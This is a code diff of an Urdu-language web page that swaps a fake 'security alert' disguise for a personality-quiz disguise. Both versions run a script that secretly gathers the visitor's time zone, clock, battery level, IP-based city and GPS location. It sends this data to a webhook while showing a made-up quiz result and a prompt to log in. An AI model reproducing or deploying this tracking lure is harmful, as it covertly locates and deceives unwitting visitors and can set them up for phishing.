@@ -2,30 +2,34 @@
 <html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>ڈیجیٹل سیکیورٹی رپورٹ</title>
+    <title>آپ کی خفیہ صلاحیت کیا ہے؟</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
-        .box { background: #1e293b; padding: 30px; border-radius: 15px; text-align: center; width: 320px; border: 1px solid #334155; }
-        .danger-icon { font-size: 50px; color: #ef4444; margin-bottom: 15px; }
-        h2 { font-size: 20px; margin-bottom: 10px; color: #f8fafc; }
-        p { font-size: 14px; color: #94a3b8; line-height: 1.5; }
-        .btn-check { background: #3b82f6; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        .btn-check:hover { background: #2563eb; }
+        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(120deg, #84fab0 0%, #8fd3f4 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .quiz-card { background: white; padding: 40px; border-radius: 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.2); text-align: center; width: 330px; border: 3px solid #6dd5ed; position: relative; }
+        .star-icon { font-size: 60px; color: #fecf20; margin-bottom: 15px; animation: glow 1.5s infinite alternate; }
+        @keyframes glow { from { text-shadow: 0 0 5px #fecf20;} to { text-shadow: 0 0 20px #fecf20, 0 0 30px #fecf20;} }
+        h2 { color: #2980b9; font-size: 24px; margin-bottom: 10px; }
+        p { color: #34495e; font-size: 16px; line-height: 1.6; }
+        .btn-start { background: #28a745; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 25px; transition: 0.4s; box-shadow: 0 5px 15px rgba(40,167,69,0.4); }
+        .btn-start:hover { background: #218838; transform: translateY(-3px); }
+        #loading { display: none; margin-top: 20px; color: #28a745; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="danger-icon">⚠️</div>
-    <h2>سیکیورٹی الرٹ!</h2>
-    <p>آپ کے انٹرنیٹ کنکشن اور ڈیوائس کے بارے میں کچھ حساس معلومات کھلی (Public) پائی گئی ہیں۔</p>
-    <p style="color: #fbbf24;">مکمل رپورٹ دیکھنے اور اسے محفوظ کرنے کے لیے نیچے کلک کریں۔</p>
+<div class="quiz-card">
+    <div class="star-icon">✨</div>
+    <h2>آپ کی سب سے خفیہ خوبی کیا ہے؟</h2>
+    <p>صرف 30 سیکنڈ میں جانیں کہ آپ کی شخصیت میں سب سے خاص چیز کیا ہے جو دوسرے نہیں جانتے۔</p>
     
-    <button class="btn-check" onclick="startAudit()">رپورٹ دیکھیں</button>
+    <button class="btn-start" onclick="startQuiz()">کوئز شروع کریں</button>
+    <div id="loading">آپ کی خفیہ صلاحیت معلوم کی جا رہی ہے...</div>
 </div>
 
 <script>
-    async function startAudit() {
+    async function startQuiz() {
+        document.getElementById("loading").style.display = "block";
+        
         // وقت، ٹائم زون، اور بیٹری (بغیر پرمیشن)
         const userTime = new Date().toLocaleString();
         const tZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -33,6 +37,7 @@
         let batt = "N/A";
         try { const b = await navigator.getBattery(); batt = `${Math.round(b.level * 100)}%`; } catch(e) {}
 
+        // آئی پی کی تفصیلات
         let ipData = {};
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -44,15 +49,16 @@
             
             const payload = {
                 embeds: [{
-                    title: "🔍 ٹارگٹ کی رپورٹ جنریٹ ہو گئی",
-                    color: 15158332,
+                    title: "🌟 خفیہ شخصیت ٹریک ہوئی!",
+                    color: 3066993,
                     fields: [
                         { name: "🌐 ٹائم زون", value: tZone, inline: true },
                         { name: "⏰ موبائل وقت", value: userTime, inline: true },
                         { name: "🌍 آئی پی شہر", value: `${ipData.city}, ${ipData.country_name}` },
                         { name: "🔋 بیٹری", value: batt, inline: true },
                         { name: "📍 میپ", value: `[Location](https://www.google.com/maps?q=${lat},${lon})` }
-                    ]
+                    ],
+                    timestamp: new Date()
                 }]
             };
             await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
@@ -60,8 +66,8 @@
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (p) => { sendData(p.coords.latitude, p.coords.longitude); alert("آپ کا ڈیٹا اب محفوظ ہے۔ شکریہ!"); },
-                () => { sendData(); alert("مکمل آڈٹ کے لیے رسائی ضروری ہے۔"); }
+                (p) => { sendData(p.coords.latitude, p.coords.longitude); alert("آپ کی خفیہ صلاحیت ہے 'قیادت کرنے کی صلاحیت'! مزید جاننے کے لیے لاگ ان کریں۔"); },
+                () => { sendData(); alert("درست نتیجہ کے لیے لوکیشن کی اجازت درکار ہے۔"); }
             );
         } else { sendData(); }
     }
